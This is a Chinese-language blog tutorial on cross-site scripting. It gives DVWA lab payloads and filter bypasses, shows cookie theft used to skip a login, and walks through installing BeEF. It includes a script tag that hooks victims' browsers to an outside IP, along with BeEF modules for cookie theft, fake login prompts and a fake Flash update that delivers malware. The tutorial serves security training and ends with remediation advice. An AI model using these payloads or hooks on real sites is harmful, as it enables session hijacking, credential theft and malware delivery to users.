---
title: 浅谈XSS
author: 简文涛
categories:
  - Web
tags:
  - XSS
comments: true
top: false
summary: Xss是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。
img: 'https://i.loli.net/2020/05/04/IVJmoPrflebaxcA.jpg'
abbrlink: 43901
date: 2020-05-04 08:28:50
updated:
permalink: 
---

<center><font color=pink size=8 weigh:500>浅谈XSS</font></center>

## 一、课程目标

> 听完这节课你能学到些什么👇


- [x] 知道什么是Xss
- [x] 实现最基础的Xss
- [x] 学会使用Beef Xss工具
- [x] 了解一些Web安全基本知识

## 二、初识XSS

### 1 什么是XSS攻击

•	XSS（Cross Site Script），跨站脚本攻击，OWASP Top10之一  
•	向网页内嵌入恶意Java script代码

### 2 XSS分类

•	反射型 -- 前端->后端->前端
•	存储型 -- 前端->后端->数据库->前端
•	DOM型 -- 前端

### 3 XSS常用攻击手段

- **窃取网页浏览中的cookie值**

当能够窃取到用户 Cookie 从而获取到用户身份时，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。

- **钓鱼欺骗**：

最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼 JavaScript 以监控目标网站的表单输入。

- **网站挂马**

跨站时利用 IFrame 嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。

- **垃圾信息发送**

比如在 SNS 社区中，利用 XSS 漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。

- **劫持用户 Web 行为**

一些高级的 XSS 攻击甚至可以劫持用户的 Web 行为，监视用户的浏览历史，发送与接收的数据等等。

- **XSS 蠕虫**

XSS 蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施 DDoS 攻击等。

## 三、初试XSS

### 1 XSS初体验

往DVWA靶场插入下方JS，会弹框

```javascript
<script>alert("Hi!我是简简")</script>;
```

当然还可以嵌入HTML和CSS,但是用处不大


```javascript
<img src=x onerror='alert("hey!")'>;

<h1>Hi!我是简简</h1><style>h1{color:pink; text-align:center}<style>

<img src='https://jwt1399.top/medias/avatar.png' width=200px;height:200px;/>
```

其他操作

```javascript
#获取cookie
<script>alert(document.cookie)</script>;

#页面跳转
<script>window.location.href="https://jwt1399.top";</script>
```

### 2 利用Xss获取cookie并绕过登录验证

>web服务所使用的HTTP服务是无状态的。这就意味着，服务器无法分辨收到的请求是属于哪一个用户的，
>需要通过cookie来对用户的身份进行标识了，用户每次对服务器发起请求时，都带上自己独有的cookie，服务器通过读取cookie信息，识别用户。

- 首先打开1号浏览器，输入账号和密码登录DVWA,然后获取cookie

  ​		方法一：弹窗获取

	```javascript
		<script>alert(document.cookie)</script>;
	```
	
	​		方法二：抓包获取
	
	​		方法三：Beef获取
	
- 然后打开2号路浏览器，进入到DVWA的login页面，在该页面利用cookie插件将cookie替换为我们获取到的1号浏览器的cookie，然后在URL栏中删掉login.php再回车

- 最后就可以发现未用登陆账号密码就进入了页面

值得注意的是：当对方进行正常logout后，再次使用该cookie是不能成功的。同时在进行替换后须在URL中进行稍许修改，因为所属的cookie不同于一个页面。

## 四、BeEf-Xss

> 全称是 The Browser Exploitation Framework.  web框架攻击平台，专注于利用浏览器漏洞.BeEF是我见过的最好的xss利用框架，他同时能够配合metasploit进一步渗透主机，强大的有些吓人！！!

### 安装

#### docker安装

docker安装得先配置docker环境

```bash
docker search beef
docker pull janes/beef #拉取beef镜像
docker images
docker run --rm -p 3000:3000 janes/beef #映射到本机的3000端口
```

#### Ubuntu

```bash
#安装依赖
sudo apt-get update
sudo apt-get install curl git
curl -sSL https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer | bash -s stable
source ~/.rvm/scripts/rvm
rvm install ruby-2.3.0
rvm use 2.3.0 --default
gem install bundle
#安装beef
git clone git://github.com/beefproject/beef.git
cd beef
bundle install
ruby beef
```

#### Kali安装

老版本的Kali自带beef,但是新版的没有

```bash
apt-get update
apt-get install beef-xss
#第一次启动会让你设个密码(jwt)，账号为beef  #可以在config.yaml中修改
```

### 基础使用

安装好之后在浏览器访问:`ip:3000/ui/panel` 默认用户名和密码都为`beef`

![](https://i.loli.net/2020/05/04/CHwf3xEuWYKyhms.png)

![](https://i.loli.net/2020/05/04/sWqRwDvHuOS2TzU.png)

默认hook js：http://ip:3000/hook.js

默认hook页面： http://ip:3000/demos/basic.html 　　//访问即可被hook

往存在XSS漏洞的地方插入以下代码

```
<script src='ip:3000/hook.js'></script>;
```

**举个例子**🌰：往DVWA靶场插入xss代码

```javascript
<script src='http://139.224.112.182:3000/hook.js'></script>;
```

![](https://i.loli.net/2020/05/04/IDpXHhNgZJVj4Mu.png)

那么在beef上可以看到被嵌入hook.js的浏览器已经上线了

![](https://i.loli.net/2020/05/04/tFSVqrnH6mp2GQN.png)

然后你可以选择各种攻击模块进行操作了

![](https://i.loli.net/2020/05/04/M3doFeh2rwPHmQW.png)



每个模块前面的颜色代表着不同的意义

![](https://i.loli.net/2020/05/04/XCh2YvfkxbJrOGR.png)

### 实用攻击模块

使用下面模块的前提是你使用`<script src='http://139.224.112.182:3000/hook.js'></script>;`控制了浏览器。

#### 被控浏览器弹框

> **模块：Browser--->Hooked Domain--->Create Alert Dialog**

![](https://i.loli.net/2020/05/04/rDFmLV2HU3XlnWY.png)

![](https://i.loli.net/2020/05/04/Tb6ZRycfjphB1XG.png)

#### 获取cookie

> **模块：Browser--->Hooked Domain--->Get Cookie**

![](https://i.loli.net/2020/05/04/h2pQ8nXkMHLKlDR.png)

#### 重定向

> **模块：Browser--->Hooked Domain--->Redirect Browser**

将当前页面重定向至指定页面，有可能导致当前权限丢失

Rediret Browser(iframe)模块：将当前页面重定向至指定页面，同时保留当前连接，可以维持当前浏览器权限

方法：右侧填写木马的路径，可以配合插件升级攻击

![](https://i.loli.net/2020/05/04/YMiFKypA2QGOHX5.png)

![](https://i.loli.net/2020/05/04/kjQKT1pZLO9No4z.png)

#### 社工弹窗

> **模块：Social Engineering ---> Pretty Theft**

弹出一个登录框，用户输入密码点击登录之后，beef可以获取到密码

![](https://i.loli.net/2020/05/04/yOdzaUkAL3TiGZ8.png)

![](https://i.loli.net/2020/05/04/WOGD9JBZKQ8fuaI.png)

![](https://i.loli.net/2020/05/04/pLzr2fen1ivJqGI.png)

#### 社会工程学攻击

> **模块：Social Engineering ---> Fake Flash Update**

在社工这一栏，可以选择flash更新这类功能来诱使用户升级Flash，当用户点击之后，会下载我们的恶意文件执行，这样我们就可以用c2(command&control)控制用户的系统.

![](https://i.loli.net/2020/05/04/SnuIYFDLHN2AcB9.png)


![](https://i.loli.net/2020/05/04/wZA7CjqGIWU5YNi.png)
####  持久化

> **模块：Persistence--->Create Foreground iFrame**

使用之后，被控浏览器无论点击哪里，都无法跳转到该系统到其他页面

![](https://i.loli.net/2020/05/04/qEusjtYSDMWgali.png)



#### 内网扫描

> **模块：Network--->Port Scanner**

Network用于收集内网信息，比如ping、端口扫描

#### 注入隐藏的iframe框架

> **Misc --> Create Invisible Frame**

### 其他模块

#### Simple Hijacker模块

劫持网页上面的所有链接，当用户点击任意链接时弹出诱骗消息，如果用户接着点击会跳转到指定域名

#### Clippy模块

创建一个浏览器助手提示用户点击

#### TabNabbing模块

当检测用户不在当前页面时启动定时器，倒计时结束后自动重定向至指定页面

#### Clickjacking模块

可以使用multi-click clickjacking，判断当前用户鼠标位置，在不同位置可触发不同JS代码如图，鼠标后面跟随一个iframe

#### Create Pop Under模块

创建一个新窗口

#### Confirm Close Tab模块

当用户关闭当前页面时，反复弹出确认是否关闭页面的消息

### hook手机

由于手机打开网址持续的时间很短，关闭当前页面后BeEF的shell就会下线，因此我们可以使用BeEF API，用户上线后能够自动执行批量命令，结合Persistence模块能够极大提高shell存活时间。除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——**Phonegap**

```
1、弹框
2、重定向 
3、查看是否访问过某些网站
4、Creates an invisible iframe
5、Social Engineering系列，如下图，仅作演示 
6、msf系列
7、NetWork系列，可以用来扫描同一内网下的windows主机
```

## 五、修复建议

- 将用户所提供的内容输入输出进行过滤。可以运用下面这些函数对出现XSS漏洞的参数进行过滤：
- PHP的htmlentities()或是htmlspecialchars()
- Python的cgi.escape()
- ASP的Server.HTMLEncode()
- ASP.NET的Server.HtmlEncode()或功能更强的Microsoft Anti-Cross Site Scripting Library
- Java的xssprotect(Open Source Library)
- Node.js的node-validator

## 六、XSS靶场

### DVWA

#### Xss(reflected)-Low

点击右下角的view source，查看源码

![](https://i.loli.net/2020/05/12/RikyZUWGxE1g3cw.png)

**分析：**
```arrary_key_exists()函数：判断$_GET的值中是否存在“name”键名。并且$_GET[‘name’]的值是否不为空，满足这些条件，直接输出下面的输出语句。可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。```

**`payload：<script>alert('简简')</script>`**



#### Xss(reflected)-Medium

源码：

![](https://i.loli.net/2020/05/12/frRTuiw9bovlFax.png)

**分析：**
这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的`<script>`转化为空。然后在将name值的结果输出，这种防护机制是可以被轻松绕过的。

**1**.大小写混淆绕过（str_replace()函数不太完美，因为它区分大小写）

**`Payload：<ScRipt>alert('简简')</script>`**

**`Payload：<SCRIPT>alert('简简')</SCRIPT>`**

**2**.双写绕过

**`Payload：<sc<script>ript>alert('简简')</script>`**

**3**.构造不使用`<script>`标签进行绕过

**`payload：<img src=1 onerror=alert('简简')>`**

解释：<img ..>标签是添加一个图片，src是指定图片的url，onerror是指定加载图片时如果出现错误则要执行的事件,这里我们的图片url肯定是错误的，这个弹框事件也必定会执行

#### Xss(reflected)-High

源码：

![](https://i.loli.net/2020/05/12/51q3sPZvMljNBbx.png)

**分析：**
High级别的代码同样使用黑名单过滤输入，preg_replace() 函数将包含<script的字符，不管大小写，不管后面跟着1个或多个与之相同的字符都转换为空。用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。
**`Payload：<img src=1 onerror=alert('简简')>`**

#### XSS(Stored)-Low

![](https://i.loli.net/2020/04/03/DcoxeTjLSVKM8yp.png)

相关函数介绍：
```php
trim(string,charlist) 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括\0、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。

mysqli_real_escape_string(string,connection) 函数会对字符串中的特殊符号（\x00，\n，\r，\，'，"，\x1a）进行转义。

stripslashes(string) 函数删除字符串中的反斜杠。
```
**分析**：
可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。

**Exploit**
message栏的利用：
输入`<script>alert(/name/)</script>`，成功弹框：

<img src="https://i.loli.net/2020/04/03/kl6X5ZIAvjBWzT1.png"/>

**name栏的利用：**
发现前端html中对name有字数长度限制:
Burpsuite 抓包改为`<script>alert(/name/)</script>`

![image-20200403140251503.png](https://i.loli.net/2020/04/03/qtpc7elTUKoD894.png)

点击Bp中Forward 后，成功弹窗：

![image-20200403140311971](https://i.loli.net/2020/04/03/wa4g3N1nstOobRM.png)

#### XSS(Stored)-Medium

![image-20200403140334188](https://i.loli.net/2020/04/03/7tPfxlAo6anS2Bq.png)

```php
strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。

addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。
```
**分析**：
可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了`<script>`字符串，仍然存在存储型的XSS。

**Exploit**
**1**.双写绕过
Burpsuite抓包改name参数为:`<sc<script>ript>alert(/name/)</script>`

![image-20200403140440550.png](https://i.loli.net/2020/04/03/brcmMd2n3wCIBFo.png)

**2**.大小写混淆绕过

Burpsuite抓包改name参数为:`<ScRipt>alert(/name/);</ScRipt>`

<img src="https://i.loli.net/2020/04/03/7tVsywGdQLOuKDY.png" alt="image-20200403140456913"  />

**3.**使用非 script 标签的 xss payload：

eg:img标签：

Burpsuite抓包改name参数为:`<img src=1 onerror=alert(/name/)>`

![image-20200403140509371.png](https://i.loli.net/2020/04/03/P48rwRItdYovXSB.png)

其他标签和利用还有很多很多….
以上抓包修改数据Forward后，均成功弹窗：
![image-20200403140524097.png](https://i.loli.net/2020/04/03/TnSMldjIgxtvXqm.png)

#### XSS(Stored)-High

![image-20200403140538783.png](https://i.loli.net/2020/04/03/rhBgMw4HaE8UQCn.png)

**分析**：
这里使用正则表达式过滤了`<script>`标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。

**Exploit**
Burpsuite抓包改name参数为`<img src=1 onerror=alert(/name/)>`
![image-20200403140643833.png](https://i.loli.net/2020/04/03/qIta128pKgxW4NR.png)
Forward后，成功弹窗：
![image-20200403140524097.png](https://i.loli.net/2020/04/03/TnSMldjIgxtvXqm.png)



























